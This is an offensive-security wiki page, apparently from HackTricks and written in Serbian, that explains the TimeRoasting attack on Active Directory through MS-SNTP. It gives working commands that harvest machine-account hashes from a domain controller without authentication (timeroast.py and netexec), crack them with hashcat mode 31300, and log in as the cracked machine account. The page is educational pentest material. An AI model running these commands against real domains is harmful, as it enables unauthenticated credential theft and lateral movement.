# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting zloupotrebljava legacy MS-SNTP authentication extension. U okviru MS-SNTP-a, client može poslati zahtev od 68 bajtova koji sadrži RID bilo kog computer account-a; domain controller koristi NTLM hash (MD4) computer account-a kao ključ za izračunavanje MAC-a nad response-om i vraća ga.<sup>[[1]](#references)</sup> Attackers mogu prikupiti ove MS-SNTP MAC-ove bez authentication-a i crack-ovati ih offline (Hashcat mode 31300) kako bi povratili lozinke computer account-ova.<sup>[[2]](#references)</sup>

Za detalje pogledajte odeljak 3.1.5.1 "Authentication Request Behavior" i odeljak 4 "Protocol Examples" u zvaničnoj MS-SNTP specifikaciji.<sup>[[1]](#references)</sup>
![TimeRoasting: Za detalje pogledajte odeljak 3.1.5.1 "Authentication Request Behavior" i odeljak 4 "Protocol Examples" u zvaničnoj MS-SNTP specifikaciji](../../images/Pasted%20image%2020250709114508.png)
Kada je ADM element ExtendedAuthenticatorSupported false, client šalje zahtev od 68 bajtova i smešta RID u najmanje značajnih 31 bit podpolja Key Identifier authenticator-a.<sup>[[1]](#references)</sup>

> Ako je ADM element ExtendedAuthenticatorSupported false, client MORA da konstruiše Client NTP Request message. Dužina Client NTP Request message-a iznosi 68 bajtova. Client postavlja Authenticator field Client NTP Request message-a na način opisan u odeljku 2.2.1, upisujući najmanje značajnih 31 bit RID value-a u najmanje značajnih 31 bit podpolja Key Identifier authenticator-a, a zatim upisujući Key Selector value u najznačajniji bit podpolja Key Identifier.

Iz odeljka 4 (Protocol Examples):

> Nakon prijema request-a, server proverava da li je veličina primljene poruke 68 bajtova. Ako je veličina primljene poruke 68 bajtova, server iz nje izdvaja RID. Server ga koristi za pozivanje metode NetrLogonComputeServerDigest (kao što je navedeno u odeljku 3.5.4.8.2 dokumenta [MS-NRPC]) radi izračunavanja crypto-checksum vrednosti i bira crypto-checksum na osnovu najznačajnijeg bita podpolja Key Identifier iz primljene poruke, kao što je navedeno u odeljku 3.2.5. Server zatim šalje response client-u, postavljajući Key Identifier field na 0, a Crypto-Checksum field na izračunatu crypto-checksum vrednost.<sup>[[1]](#references)</sup>

Crypto-checksum je zasnovan na MD5-u (pogledajte 3.2.5.1.1) i može se crack-ovati offline, čime se omogućava roasting attack.<sup>[[1]](#references)</sup>

## Kako izvršiti napad

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts autora Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Praktični napad (unauth) sa NetExec + Hashcat

- NetExec može da enumeriše i prikuplja MS-SNTP MAC adrese za RID-ove računara bez autentifikacije i ispisuje $sntp-ms$ hash-eve spremne za cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline pomoću Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Oporavljeni cleartext odgovara lozinci computer account-a. Pokušajte da je direktno koristite kao machine account putem Kerberos-a (-k) kada je NTLM onemogućen:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Operativni saveti
- Obezbedite preciznu sinhronizaciju vremena pre Kerberos-a: `sudo ntpdate <dc_fqdn>`
- Ako je potrebno, generišite krb5.conf za AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Kasnije mapirajte RIDs na principals putem LDAP/BloodHound-a kada ostvarite bilo kakav authenticated foothold.

## Reference

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – zvanična dokumentacija](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
